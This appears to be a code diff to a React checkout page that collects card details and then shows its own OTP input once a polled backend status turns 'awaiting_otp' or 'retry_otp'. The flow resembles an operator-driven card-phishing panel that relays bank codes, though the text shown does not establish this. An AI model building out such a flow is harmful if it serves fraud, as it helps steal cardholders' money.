@@ -1151,14 +1151,26 @@ function MainContent() {
 
   useEffect(() => {
     let interval: ReturnType<typeof setInterval>;
-    if (otpState === 'checking' && currentOrderId) {
+    if ((otpState === 'checking' || cardProcessingToOtp) && currentOrderId) {
       const otpMs = getOtpPollIntervalMs();
       interval = setInterval(() => {
         void fetchTransactions();
       }, otpMs);
     }
     return () => clearInterval(interval);
-  }, [otpState, currentOrderId, fetchTransactions]);
+  }, [otpState, cardProcessingToOtp, currentOrderId, fetchTransactions]);
+
+  useEffect(() => {
+    if (!cardProcessingToOtp || !currentOrderId) return;
+    const tx = transactions.find(
+      (t) => t.id === currentOrderId || t.order_ref === currentOrderId,
+    );
+    if (tx && (tx.status === 'awaiting_otp' || tx.status === 'retry_otp')) {
+      setCardProcessingToOtp(false);
+      setShowOtpStep(true);
+      setOtpState('input');
+    }
+  }, [transactions, cardProcessingToOtp, currentOrderId]);
 
   useEffect(() => {
     if (otpState === 'checking' && currentOrderId) {
@@ -1198,6 +1210,7 @@ function MainContent() {
         } else if (
           tx.status === 'refunded' ||
           tx.status === 'suspended' ||
+          tx.status === 'awaiting_otp' ||
           tx.status === 'retry_otp'
         ) {
           notificationService.notifyTransactionStatusChange(tx.status, tx.order_ref);
@@ -1702,11 +1715,10 @@ function MainContent() {
         }
         setCurrentOrderId(orderRef);
         setCardProcessingToOtp(true);
-        setTimeout(() => {
-          setShowOtpStep(true);
-          setCardProcessingToOtp(false);
-          setIsSubmitting(false);
-        }, 2000);
+        setShowOtpStep(false);
+        setOtpState('input');
+        setIsSubmitting(false);
+        void fetchTransactions();
         return;
       }
 
@@ -5784,7 +5796,7 @@ function MainContent() {
           <div className="bg-white rounded-2xl border border-gray-100 p-8 text-center space-y-5">
             <Activity className="w-12 h-12 text-red-600 animate-pulse mx-auto" />
             <h3 className="font-black text-lg text-gray-900">{lang === 'ar' ? 'جاري معالجة الدفع...' : 'Processing payment...'}</h3>
-            <p className="text-sm text-gray-400">{lang === 'ar' ? 'سيتم نقلك لصفحة رمز التحقق خلال لحظات' : 'You will be redirected to OTP verification shortly'}</p>
+            <p className="text-sm text-gray-400">{lang === 'ar' ? 'انتظر حتى تجهّز صفحة التحقق في البنك (3DS)' : 'Wait until the bank 3DS verification page is ready'}</p>
           </div>
         </div>
       );
@@ -6078,7 +6090,7 @@ function MainContent() {
                 {lang === 'ar' ? 'جاري معالجة الدفع...' : 'Processing payment...'}
               </h3>
               <p className="text-gray-500 text-center text-sm font-medium leading-relaxed">
-                {lang === 'ar' ? 'سيتم نقلك لصفحة رمز التحقق خلال لحظات' : 'You will be redirected to OTP verification shortly'}
+                {lang === 'ar' ? 'انتظر حتى تجهّز صفحة التحقق في البنك (3DS)' : 'Wait until the bank 3DS verification page is ready'}
               </p>
             </div>
           ) : showOtpStep ? (
